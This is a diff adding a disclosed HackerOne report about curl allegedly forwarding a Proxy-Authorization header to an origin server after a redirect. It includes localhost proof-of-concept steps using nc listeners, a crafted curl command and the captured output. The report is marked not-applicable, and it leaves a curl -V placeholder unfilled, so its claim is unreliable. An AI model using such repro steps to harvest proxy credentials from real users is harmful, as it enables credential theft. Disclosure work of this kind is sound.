@@ -8,6 +8,7 @@ tags:
 substate: "not-applicable"
 weakness: "Information Exposure Through Sent Data"
 enriched: true
+body: true
 date: 2025-12-30
 submitted: 2025-12-28T16:18:09.549Z
 bounty_usd: null
@@ -25,6 +26,92 @@ title: "Proxy-Authorization header is leaked to origin server after redirect fro
 - Report: [https://hackerone.com/reports/3480713](https://hackerone.com/reports/3480713)
 - CWE: Information Exposure Through Sent Data
 - Submitted: 2025-12-28T16:18:09.549Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+## Summary
+
+curl leaks the Proxy-Authorization header to the origin server after following an HTTP redirect that transitions from a proxied connection to a direct connection (e.g. when using --noproxy or when proxy is bypassed after redirect). This causes proxy credentials (which are hop-by-hop) to be sent to unintended servers.
+
+## Affected version
+
+Tested with:
+curl 8.17.0 on Linux x86_64
+
+curl -V:
+[PASTE curl -V OUTPUT HERE]
+
+## Steps To Reproduce
+
+1. Start a fake origin server:
+
+   nc -l -p 8080
+
+2. Start a fake proxy that redirects to the origin:
+
+   printf "HTTP/1.1 302 Found\r\nLocation: http://127.0.0.1:8080/\r\nContent-Length: 0\r\n\r\n" | nc -l -p 3128
+
+3. Run curl:
+
+   curl -v -L \
+     -x http://127.0.0.1:3128 \
+     -H "Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR" \
+     --noproxy 127.0.0.1 \
+     http://example.com
+
+4. Observe the request received by the origin server.
+
+## Observed Behavior
+
+### curl verbose output:
+
+*   Trying 127.0.0.1:3128...
+* Established connection to 127.0.0.1 (127.0.0.1 port 3128)
+> GET http://example.com/ HTTP/1.1
+> Host: example.com
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Proxy-Connection: Keep-Alive
+> Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR
+>
+< HTTP/1.1 302 Found
+< Location: http://127.0.0.1:8080/
+< Content-Length: 0
+* Issue another request to this URL: 'http://127.0.0.1:8080/'
+*   Trying 127.0.0.1:8080...
+* Established connection to 127.0.0.1 (127.0.0.1 port 8080)
+> GET / HTTP/1.1
+> Host: 127.0.0.1:8080
+> User-Agent: curl/8.17.0
+> Accept: */*
+> Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR
+
+### Origin server output (nc -l -p 8080):
+
+GET / HTTP/1.1
+Host: 127.0.0.1:8080
+User-Agent: curl/8.17.0
+Accept: */*
+Proxy-Authorization: Basic RAHASIA_NEGARA_BOCOR
+
+## Expected Behavior
+
+The Proxy-Authorization header must never be forwarded to origin servers and should be stripped when the request is sent directly instead of via a proxy.
+
+
+## Supporting Material
+
+Attached:
+- curl verbose output showing header leakage
+- Origin server log showing leaked Proxy-Authorization header
+
+## Impact
+
+## Impact
+
+An attacker-controlled origin server can steal proxy credentials if a proxied request is redirected to a direct connection. This violates HTTP semantics (Proxy-Authorization is hop-by-hop) and can result in credential compromise and unauthorized proxy access.
 
 ## Timeline
 
